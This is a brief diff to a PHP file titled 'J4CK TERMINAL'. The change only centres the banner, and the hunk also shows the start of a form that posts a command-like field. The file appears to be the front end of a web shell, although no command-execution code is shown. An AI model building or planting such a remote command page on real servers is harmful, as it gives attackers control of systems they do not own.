@@ -1,5 +1,5 @@
 <?php
-echo "./J4CK TERMINAL";
+echo "<center>./J4CK TERMINAL</center>";
         echo "<pre>";
         echo "<center><form name='form' action='#' method='post'>
         <input type='text' name='123'/> <input type='submit' value='enter'/>
